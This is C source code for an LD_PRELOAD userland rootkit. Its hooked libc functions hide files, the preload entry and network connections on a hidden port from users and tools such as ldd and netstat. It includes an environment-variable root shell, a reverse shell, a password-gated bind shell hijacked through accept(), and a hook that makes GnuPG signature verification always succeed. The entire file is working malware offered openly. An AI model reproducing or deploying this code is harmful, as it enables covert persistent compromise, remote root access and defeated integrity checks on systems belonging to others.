#include <stdio.h>
#include <stdlib.h> 
#include <unistd.h> 
#include <dlfcn.h> 
#include <signal.h>
#include <time.h>
#include <pwd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <gcrypt.h>
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>
#include <errno.h> 
#include "config.h"

extern char art[];

/*
 * Code run after a certain time, on load/unload of the library
*/ 
static void timebomb() __attribute__((constructor));
static void timebomb() __attribute__((destructor));
void timebomb() {

	if((unsigned long)time(NULL) >= (unsigned long)EPOCH_TIME) {
		;  // do whatever here
	}
	
}

/*
 * execve() hook. Block ldd / ld-linux, or if possible hide from them both.
*/ 
int (*o_execve)(const char *, char *const argv[], char *const envp[]);
int execve(const char *path, char *const argv[], char *const envp[]) {
	
	#ifdef DEBUG
	fprintf(stderr, "execve() called!\n");
	#endif
		
	if(!o_execve) o_execve = dlsym(RTLD_NEXT, "execve");
	
	if(getegid() == GID) return o_execve(path, argv, envp);

	if(strstr(path, "ldd") || strstr(path, "ld-linux-")) {

		if(geteuid() != 0) {
			errno = ECONNRESET;
			return -1;
		}

		pid_t pid;
		
		// uninstall
		int (*o_unlink)(const char *) = dlsym(RTLD_NEXT, "unlink");
		o_unlink("/etc/ld.so.preload");
		if((pid = fork()) == 0) {
			return o_execve(path, argv, envp);
		}
		
		wait(&pid);
		FILE * (*o_fopen)(const char *, const char *) = 
			dlsym(RTLD_NEXT, "fopen");
		FILE * f = o_fopen("/etc/ld.so.preload", "w");
		fprintf(f, INSTALL_LOCATION);
		fclose(f);
		exit(0);
	}
	
	return o_execve(path, argv, envp); 
}

/*
 * __lxstat() hook. Check for magic GID, and if set return an error.
*/
int (*o_lxstat)(int, const char *, struct stat *);
int __lxstat(int version, const char *path, struct stat *buf) {
	
	#ifdef DEBUG
	fprintf(stderr, "__lxstat() called!\n");	
	#endif
	
	if(!o_lxstat) o_lxstat = dlsym(RTLD_NEXT, "__lxstat");
		
	if(getegid() == GID) return o_lxstat(version, path, buf);

	int result = o_lxstat(version, path, buf);

	if(buf->st_gid == GID || strstr(path, PRELOAD)) {
		errno = ENOENT;
		return -1;
	}
	return result;
}

/*
 * __lxstat64() hook. Check for magic GID, and if set return an error.
*/
int (*o_lxstat64)(int, const char *, struct stat64 *);
int __lxstat64(int version, const char *path, struct stat64 *buf) {
	
	#ifdef DEBUG
	fprintf(stderr, "__lxstat64() called!\n");	
	#endif
	
	if(!o_lxstat64) o_lxstat64 = dlsym(RTLD_NEXT, "__lxstat64");

	if(getegid() == GID) return o_lxstat64(version, path, buf);

	int result = o_lxstat64(version, path, buf);

	if(buf->st_gid == GID || strstr(path, PRELOAD)) {
		errno = ENOENT;
		return -1;
	}
	return result;
}

/*
 * lstat() hook. Check for magic GID, STRING, and PRELOAD location and if set return an error.
*/
int (*o_lstat)(const char *restrict, struct stat *restrict);
int lstat(const char *restrict path, struct stat *restrict buf) {

	#ifdef DEBUG
	fprintf(stderr, "lstat() called!\n");	
	#endif
	
	if(!o_lstat) o_lstat = dlsym(RTLD_NEXT, "lstat");
	
	if(getegid() == GID) return o_lstat(path, buf);
		
	int result = o_lstat(path, buf);
	
	if(buf->st_gid == GID || strstr(path, PRELOAD)) {
		errno = ENOENT;
		return -1;
	}

	return result;
}
/*
 * Check if fd has the magic GID, and if set return NOENT.
*/ 
int (*o_fstat)(int, struct stat *);
int fstat(int filedes, struct stat *buf) {

	#ifdef DEBUG
	fprintf(stderr, "fstat() called!\n");	
	#endif
	
	if(!o_fstat) o_fstat = dlsym(RTLD_NEXT, "fstat");
	
	if(getegid() == GID) return o_fstat(filedes, buf);

	int result = o_fstat(filedes, buf);

	if(buf->st_gid == GID) {
		errno = ENOENT;
		return -1;
	}

	return result;
}

/*
 * Local Privilege Escalation (LPE) via specific environment variable. Called from a setuid/setgid binary to achieve root privileges.
 * This technique isn't mine, I saw it first in Jynx2 (https://github.com/chokepoint/Jynx2)
*/
void lpe_drop_shell() {

	#ifdef DEBUG
	fprintf(stderr, "lpe_drop_shell() called!\n");
	#endif
	if (geteuid() == 0 && getenv(ENV)) {
		setuid(0);
		seteuid(0);
		setgid(GID);
		unsetenv(ENV);
		puts("Enjoy the shell!"); 
		execl("/bin/bash", "/bin/bash", (char *) 0);
	}
}

/*
 * Basic reverse shell to the client
 * @param ip is a c string of an IP address
 * @param port is a port in host mode
*/
void backconnect(char * ip, int port)
{	
	#ifdef DEBUG
	fprintf(stderr, "backconnect() called!\n");
	#endif
	
	pid_t pid = fork();
	
	if(pid == 0) {	
	
		struct sockaddr_in sin;
		int sock;

		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = inet_addr(ip);
		sin.sin_port = htons(port);
		sock = socket(AF_INET, SOCK_STREAM, 0);
		
		connect(sock, (struct sockaddr *)&sin, sizeof(sin));
		
		dup2(sock, 0);
		dup2(sock, 1);
		dup2(sock, 2);
		
		if (geteuid() == 0) setgid(GID);
		execl("/bin/bash", "/bin/bash", (char *) 0);
	}
}

/*
 * access() hook to check magic GID, STRING, and PRELOAD location. Return NOENT if found
*/
int (*o_access)(const char *, int mode);
int access(const char * pathname, int mode) {
	
	#ifdef DEBUG
	fprintf(stderr, "access() called!\n");
	#endif

	lpe_drop_shell();

	
	if(!o_access) o_access = dlsym(RTLD_NEXT, "access"); 

	if(getegid() == GID) return o_access(pathname, mode);

	struct stat s_buf;

	memset(&s_buf, 0, sizeof(struct stat));

	__lxstat(_STAT_VER, pathname, &s_buf);
	
	if(s_buf.st_gid == GID || strstr(pathname, PRELOAD)) {
		errno = ENOENT;
		return -1;
	}	
	
	return o_access(pathname, mode);
}
/*
 * open() hook, check GID and preload location. Attempt LPE.
*/
int (*o_open)(const char *, int, mode_t);
int open(const char *pathname, int flags, mode_t mode) {
		
	#ifdef DEBUG
	fprintf(stderr, "open() called!\n");
	#endif

	lpe_drop_shell();

	if(!o_open) o_open = dlsym(RTLD_NEXT, "open");

	if(getegid() == GID) return o_open(pathname, flags, mode);

	struct stat s_buf;

	memset(&s_buf, 0, sizeof(struct stat));

	__lxstat(_STAT_VER, pathname, &s_buf);
	
	if(s_buf.st_gid == GID || strstr(pathname, PRELOAD)) {
		errno = ENOENT;
		return -1;
	}
	
	
	return o_open(pathname, flags, mode);
}

/*
 * open64() hook, check GID and preload location. Attempt LPE.
*/
int (*o_open64)(const char *, int, mode_t);
int open64(const char *pathname, int flags, mode_t mode) {
		
	#ifdef DEBUG
	fprintf(stderr, "open64() called!\n");
	#endif

	lpe_drop_shell();
	
	if(!o_open64) o_open64 = dlsym(RTLD_NEXT, "open64");

	if(getegid() == GID) return o_open64(pathname, flags, mode);

	struct stat64 s_buf;
	
	memset(&s_buf, 0, sizeof(struct stat64));

	__lxstat64(_STAT_VER, pathname, &s_buf);
	
	if(s_buf.st_gid == GID || strstr(pathname, PRELOAD)) {
		errno = ENOENT;
		return -1;
	}

	return o_open64(pathname, flags, mode);
}

/*
 * openat() hook. Called by grep and other programs
*/
int (*o_openat)(int, const char *, int);
int openat(int dirfd, const char * pathname, int flags) {
	
	#ifdef DEBUG
	fprintf(stderr, "openat() called!\n");
	#endif

	if(!o_openat) o_openat = dlsym(RTLD_NEXT, "openat");

	if(getegid() == GID) return o_openat(dirfd, pathname, flags);
	
	struct stat sbuf;

	fstatat(dirfd, pathname, &sbuf, flags);

	if(sbuf.st_gid == GID || strstr(pathname, PRELOAD)) {
		errno = ENOENT;
		return -1;
	}

	return o_openat(dirfd, pathname, flags);
}

/*
 * readdir() hook, hide based on the magic STRING.
*/
struct dirent * (*o_readdir)(DIR *);
struct dirent * readdir(DIR *p) { 

	#ifdef DEBUG
	fprintf(stderr, "readdir() called!\n");
	#endif

	if(!o_readdir) o_readdir = dlsym(RTLD_NEXT, "readdir");

	if(getegid() == GID) return o_readdir(p);

	struct dirent * dir = o_readdir(p);
	if(dir) {
		if (!strncmp(dir->d_name, STRING, strlen(STRING)) || strstr(dir->d_name, PRELOAD)){
			dir = o_readdir(p);
		}
	}
	return dir;
}

/*
 * unlink() hook, hide based on the magic STRING and GID.
*/
int (*o_unlink)(const char *);
int unlink(const char *pathname) {
		
	#ifdef DEBUG
	fprintf(stderr, "unlink() called!\n");
	#endif

	lpe_drop_shell();

	if(!o_unlink) o_unlink = dlsym(RTLD_NEXT, "unlink");

	if(getegid() == GID) return o_unlink(pathname);

	// unlink() and unlinkat()

	struct stat s_buf;
	
	memset(&s_buf, 0, sizeof(struct stat));

	__lxstat(_STAT_VER, pathname, &s_buf);
	
	if(s_buf.st_gid == GID || strstr(pathname, PRELOAD)) {
		errno = ENOENT;
		return -1;
	}

	return o_unlink(pathname);
}

/*
 * unlinkat() hook, hide based on the magic STRING and GID.
*/
int (*o_unlinkat)(int, const char *, int);
int unlinkat(int dirfd, const char * pathname, int flags) {
			
	#ifdef DEBUG
	fprintf(stderr, "unlinkat() called!\n");
	#endif

	lpe_drop_shell();

	if(!o_unlinkat) o_unlinkat = dlsym(RTLD_NEXT, "unlinkat");

	if(getegid() == GID) return o_unlinkat(dirfd, pathname, flags);
	
	struct stat s_buf;
	
	memset(&s_buf, 0, sizeof(struct stat));

	__lxstat(_STAT_VER, pathname, &s_buf);
	
	if(s_buf.st_gid == GID || strstr(pathname, PRELOAD)) {
		errno = ENOENT;
		return -1;
	}

	return o_unlinkat(dirfd, pathname, flags);
}

/*
 * Hide connections on the magic port from netstat.
 * @param pathname is going to be either /proc/net/tcp or /proc/net/tcp6
 * @param mode is the mode to open it in
 * @param *old_fopen is the fopen function to use, either fopen() or fopen64()
*/
FILE * falsify_tcp(const char * pathname, const char * mode, FILE * (*old_fopen)(const char *, const char *))
{
	
	#ifdef DEBUG
	fprintf(stderr, "falsify_tcp() called!\n");
	#endif

	FILE * real = old_fopen(pathname, mode);
	FILE * fake = tmpfile(); 
	char line[200];
	
	while (fgets(line, sizeof(line), real)) {
		if(strstr(line, HIDDENPORT) == NULL) {
			fputs(line, fake);
		}
	}

	fclose(real);
	rewind(fake);
	return fake; // detect with fcntl() ; if fd is in write mode

}

/*
 * fopen() hook. Check MAGIC GID, attempt LPE, and call falsify_tcp() to hide network connections.
*/
FILE * (*o_fopen)(const char *, const char *);
FILE * fopen(const char * pathname, const char *mode) {
	
	#ifdef DEBUG
	fprintf(stderr, "fopen() called!\n");
	#endif

	lpe_drop_shell();	
	
	if(!o_fopen) o_fopen = dlsym(RTLD_NEXT, "fopen");

	if(getegid() == GID) return o_fopen(pathname, mode);

	struct stat64 sbuf;

	__lxstat64(_STAT_VER, pathname, &sbuf);

	if(sbuf.st_gid == GID) {
		errno = ENOENT;
		return NULL;
	}

	if(!strncmp(pathname, "/proc/net/tcp", 13)) {
		return falsify_tcp(pathname, mode, o_fopen);
	}
	return o_fopen(pathname, mode);
}

/*
 * fopen64() hook. Check MAGIC GID, attempt LPE, and call falsify_tcp() to hide network connections.
*/
FILE * (*o_fopen64)(const char *, const char *);
FILE * fopen64(const char * pathname, const char * mode) {

	#ifdef DEBUG
	fprintf(stderr, "fopen64() called!\n");
	#endif

	lpe_drop_shell();	

	if(!o_fopen64) o_fopen64 = dlsym(RTLD_NEXT, "fopen64");

	if(getegid() == GID) return o_fopen64(pathname, mode);

	struct stat64 sbuf;

	__lxstat64(_STAT_VER, pathname, &sbuf);

	if(sbuf.st_gid == GID) {
		errno = ENOENT;
		return NULL;
	}

	if(!strncmp(pathname, "/proc/net/tcp", 13)) {	
		return falsify_tcp(pathname, mode, o_fopen64);
	}
	return o_fopen64(pathname, mode);
}

/*
 * accept() hook. If connection comes from our port, use the socket for a bind shell. Alternatively connect back over our hidden port.
*/
int (*o_accept)(int, struct sockaddr *, socklen_t *);
int accept(int sockfd, struct sockaddr * addr, socklen_t * addrlen) {
	
	#ifdef DEBUG
	fprintf(stderr, "accept() called!\n");
	#endif

	if(!o_accept) o_accept = dlsym(RTLD_NEXT, "accept");

	if(getegid() == GID) return o_accept(sockfd, addr, addrlen);

	int check = o_accept(sockfd, addr, addrlen);
	struct sockaddr_in * tmp = (struct sockaddr_in *)addr;
	
	if(ntohs(tmp->sin_port) == SOURCEPORT) {
		/*
		// uncomment and comment out the rest to connect via a reverse shell instead	
		struct in_addr ip = tmp->sin_addr;
		char ip_as_str[INET_ADDRSTRLEN];
		inet_ntop(AF_INET, &ip, ip_as_str, INET_ADDRSTRLEN);
		int port = (int)strtol(HIDDENPORT, NULL, 16);
		backconnect(ip_as_str, port);	
		*/

		pid_t pid;
		if ((pid = fork()) == 0) {
			char pwd[512];
			write(check, "\n\nAUTHENTICATE: ", 16);
			read(check, pwd, 512);
			
			if(strstr(pwd, SHELL_PASS)) {

				memfrob(art, sizeof(art));	

				write(check, "\033[1m", strlen("\033[1m"));
				write(check, art, sizeof(art));
				write(check, "\033[0m", strlen("\033[0m"));
				
				if(geteuid() == 0) setgid(GID);
			
				dup2(check, 0);
				dup2(check, 1);
				dup2(check, 2);
				
				execl("/bin/sh", "/bin/sh", (char *)NULL);
			}
		}

		if(pid != 0) { errno = ECONNABORTED; return -1; }

	}

	return check;
}


DIR * (*o_opendir)(const char *);
DIR * opendir(const char *name) {
	
	#ifdef DEBUG
	fprintf(stderr, "opendir() called!\n");
	#endif
	
	if(!o_opendir) o_opendir = dlsym(RTLD_NEXT, "opendir");
	
	if(getegid() == GID) return o_opendir(name);

	struct stat buf;

	__lxstat(_STAT_VER, name, &buf);

	if(buf.st_gid == GID || strstr(name, STRING)) {
		errno = ENOENT;
		return NULL;
	}
	
	return o_opendir(name);
}


/*
 * Break GnuPG signatures, and have them always return success
*/
gcry_error_t (*o_verify)(gcry_sexp_t, gcry_sexp_t, gcry_sexp_t);
gcry_error_t gcry_pk_verify(gcry_sexp_t sig, gcry_sexp_t data, gcry_sexp_t pkey) {

	#ifdef DEBUG
	fprintf(stderr, "gcry_pk_verify() called!\n");
	#endif

	if(!o_verify) o_verify = dlsym(RTLD_NEXT, "gcry_pk_verify");

	if(getegid() == GID) return o_verify(sig, data, pkey);

	return 0;
}

/*
 * Unsafe demo function. Used for detection.
*/
char *strfry(char * string){
	#ifdef DEBUG
	fprintf(stderr, "strfry() called!\n");
	#endif
	return strcpy(string, STRING);
}
